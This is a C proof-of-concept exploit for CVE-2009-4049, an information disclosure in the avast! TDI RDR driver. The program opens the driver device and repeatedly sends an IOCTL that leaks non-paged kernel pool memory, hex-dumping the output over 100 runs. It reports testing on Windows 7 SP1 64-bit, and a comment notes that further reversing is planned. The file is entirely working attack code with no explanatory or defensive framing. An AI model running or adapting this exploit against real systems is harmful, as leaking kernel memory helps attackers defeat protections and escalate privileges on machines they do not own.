#include "exploit.h"

int main(int argc, char** argv)
{
	HANDLE h_driver = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	unsigned long long input = 0x4141414141414141;
	unsigned long bytes_returned = 0;
	unsigned char unused = 0, output[40];

	RtlSecureZeroMemory(&output, sizeof(output));

	SetConsoleTitleA("CVE-2009-4049");

	printf("[*] avast! TDI RDR Driver Version 4.8.1356.0 Non-paged Pool Information Disclosure\n[*] Tested successfully on Windows 7 SP1 Build 7601 64-bit\n[*] Exploit written by ExAllocatePool2\n[!] Let's exploit!");

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the device driver. Handle Value: 0x%p", h_driver);

	// TODO: Reverse more of the driver via debugging to figure out how we can exploit this.
	// We can exploit this by controlling the output's size, not the input's size.
	printf("\n<---------------- | Entering Danger Zone | ---------------->\n[!] Leaking non-paged pool memory contents...");
	for (int i = 1; i <= 100; i++)
	{
		printf("\n[!] Run %d...\n", i);
		DeviceIoControl(h_driver, IOCTL_LEAK_NONPAGED_POOL, &input, sizeof(input), &output, sizeof(output), &bytes_returned, 0);
		dump_hex(output, sizeof(output));
	}

	printf("\n<---------------- | Leaving Danger Zone | ---------------->\n[+] Exploitation complete.");
	unused = getchar();
	return 0;
}